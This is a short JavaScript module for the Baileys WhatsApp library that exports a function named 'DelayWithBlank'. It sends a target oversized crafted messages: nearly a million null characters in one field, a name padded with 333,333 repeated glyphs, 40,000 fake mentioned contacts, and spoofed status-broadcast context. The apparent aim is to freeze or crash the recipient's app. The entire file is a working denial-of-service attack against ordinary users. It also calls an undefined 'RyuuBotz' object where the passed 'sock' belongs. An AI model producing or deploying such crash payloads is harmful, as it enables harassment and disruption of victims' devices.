const crypto = require("crypto");
const { generateWAMessageFromContent } = require("@whiskeysockets/baileys");

async function DelayWithBlank(sock, target) {
  const mentionedList = Array.from(
    { length: 40000 },
    () => `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`
  );

  const system = "꧀".repeat(333333);

  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            messageSecret: crypto.randomBytes(32),
          },
          interactiveResponseMessage: {
            body: {
              text: "是𝐂𝐨𝐬𝐦𝐨𝐗区",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "是𝐂𝐨𝐬𝐦𝐨𝐗区",
              paramsJson: "\u0000".repeat(999999),
              version: 3,
            },
            contextInfo: {
              isForwarded: true,
              forwardingScore: 9999,
              forwardedNewsletterMessageInfo: {
                newsletterName: "(trigger) cosmo",
                newsletterJid: "120363321780343299@newsletter",
                serverMessageId: 1,
              },
            },
          },
        },
      },
    },
    {}
  );

  await RyuuBotz.sendMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
          },
        ],
      },
    ],
  });

  await RyuuBotz.sendMessage(target, {
    text: "是𝐂𝐨𝐬𝐦𝐨𝐗区",
    contextInfo: {
      mentionedJid: mentionedList,
      quotedMessage: {
        viewOnceMessage: {
          message: {
            groupStatusMentionMessage: {
              name: "是𝐂𝐨𝐬𝐦𝐨𝐗区" + system,
              jid: target,
              mention: [target],
              contextInfo: {
                mentionedJid: mentionedList,
              },
            },
          },
        },
      },
      remoteJid: "status@broadcast",
      participant: "0@s.whatsapp.net",
      fromMe: true,
    },
  });

  await RyuuBotz.sendMessage(
    target,
    {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25,
          },
        },
      },
    },
    {
      additionalNodes: [
        {
          tag: "meta",
          attrs: { is_status_mention: "true" },
          content: undefined,
        },
      ],
    }
  );
}

module.exports = DelayWithBlank;